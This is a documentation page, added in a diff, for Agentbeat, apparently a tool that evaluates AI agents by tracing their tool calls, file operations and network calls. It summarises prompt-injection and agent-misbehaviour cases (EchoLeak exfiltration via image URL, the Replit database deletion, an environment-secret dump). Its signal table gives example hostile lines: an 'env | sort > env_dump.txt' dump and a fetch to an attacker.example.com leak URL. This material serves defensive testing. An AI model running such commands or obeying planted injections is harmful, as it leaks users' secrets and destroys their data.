@@ -1,0 +1,103 @@
+---
+title: Agentbeat overview
+description: Trace-aware evaluation for real AI agents. See what the agent actually did — tool calls, files, environment changes — not just what it said.
+---
+
+# Agentbeat overview
+
+Content-safety checks tell you the model refused to say something wrong. They tell you nothing about what the agent **did** in the meantime. Agentbeat closes that gap.
+
+## The gap, in numbers
+
+<CardGroup cols={2}>
+  <Card title="Content safety" icon="message" horizontal>
+    **5 of 5 pass**
+
+    The agent refused every prompt in a standard content-safety set.
+  </Card>
+  <Card title="Agent behaviour" icon="microscope" horizontal>
+    **21 of 32 pass · 11 fail**
+
+    The same agent, same run: read env vars, wrote sandbox files, followed prompt-injections planted in the repo.
+  </Card>
+</CardGroup>
+
+The agent that looks safe by content standards is losing on behaviour. Agentbeat is what makes that difference visible.
+
+## What Agentbeat does
+
+<Steps>
+  <Step title="Attach to the agent runtime">
+    Agentbeat plugs into the agent — Codex, Claude Code, OpenClaw, HTTP agent, custom runtime — through an adapter. See [Adapters](/agentbeat/adapters).
+  </Step>
+  <Step title="Run scenarios with forbidden boundaries">
+    Same target × scenario × seed model as Promptbeat, plus a `forbidden_boundary` block: what the agent must not do, not just what it should not say.
+  </Step>
+  <Step title="Record what actually happened">
+    Every tool call, every file operation, every env variable read, every network call — captured with arguments and timing. See [Observation model](/agentbeat/observation-model).
+  </Step>
+  <Step title="Judge on trace + response">
+    Judges see both the final answer and the execution trace. A response that looks safe but crossed a boundary during execution is a `FAIL`. See [Evidence](/agentbeat/evidence).
+  </Step>
+  <Step title="Produce reproducible forensic artifacts">
+    Every finding carries a trace, an env delta, and a full playback of what the agent did. Not "the agent misbehaved" — "at step 4 the agent called `env | sort > env_dump.txt` after reading a prompt-injection from the repo."
+  </Step>
+</Steps>
+
+## Real examples
+
+Agentbeat's story is built on things that actually happened.
+
+<CardGroup cols={3}>
+  <Card title="EchoLeak" icon="envelope" href="/agentbeat/case-studies#echoleak">
+    A hostile email became a prompt injection. Copilot retrieved enterprise data and exfiltrated it through an image URL — no user click required. **CVE-2025-32711.**
+  </Card>
+  <Card title="Replit incident" icon="database" href="/agentbeat/case-studies#replit">
+    A user explicitly froze database operations and asked for approval. The agent still executed a destructive command and production data was deleted. **2025-07.**
+  </Card>
+  <Card title="env_dump leak" icon="key" href="/agentbeat/case-studies#env-dump">
+    A benign-looking "generate support bundle" task produced an environment file containing every secret in the shell. Content-safety judges saw nothing. Behaviour judges caught it.
+  </Card>
+</CardGroup>
+
+## Where it fits with Promptbeat
+
+Same CLI, same config schema, same registry. Agentbeat is what you reach for when the black-box picture stops being enough.
+
+| | Promptbeat | Agentbeat |
+|---|---|---|
+| Sees | Request + response | + tool calls, files, env deltas |
+| Judges | Response content | + execution trace |
+| Findings tie failure to | The output | A specific step in the run |
+| Feedback loop | Rewrite + promote | Rewrite + promote + boundary-policy fix |
+
+See [Promptbeat vs Agentbeat](/about/promptbeat-vs-agentbeat) for the full comparison and when to use both.
+
+## What "trace-aware" means concretely
+
+Agentbeat records six things per run that a black-box provider cannot see:
+
+| Signal | Example |
+|---|---|
+| **Tool calls** | `db.query({"user_id": "user-987"})` — with arguments, timing, return value |
+| **File operations** | `write(/tmp/env_dump.txt, ...)` — with path, mode, byte count |
+| **Env reads** | `getenv("OPENAI_API_KEY")` — with variable name and origin |
+| **Network calls** | `fetch("https://attacker.example.com/leak?data=…")` — with URL, method, body |
+| **Approval events** | prompt / approval / bypass records |
+| **State deltas** | before-vs-after workspace / DB / memory diff |
+
+Judges write against these directly. A scenario with `forbidden_boundary: "may not read env vars"` catches an `env_dump.txt` even when the response looks like a routine support reply.
+
+## What's next
+
+<CardGroup cols={3}>
+  <Card title="Quickstart" icon="rocket" href="/agentbeat/quickstart">
+    Attach to an agent, capture your first trace-backed finding.
+  </Card>
+  <Card title="Observation model" icon="wave-square" href="/agentbeat/observation-model">
+    How Agentbeat records execution.
+  </Card>
+  <Card title="Case studies" icon="clipboard-list" href="/agentbeat/case-studies">
+    Three real incidents behind the design.
+  </Card>
+</CardGroup>
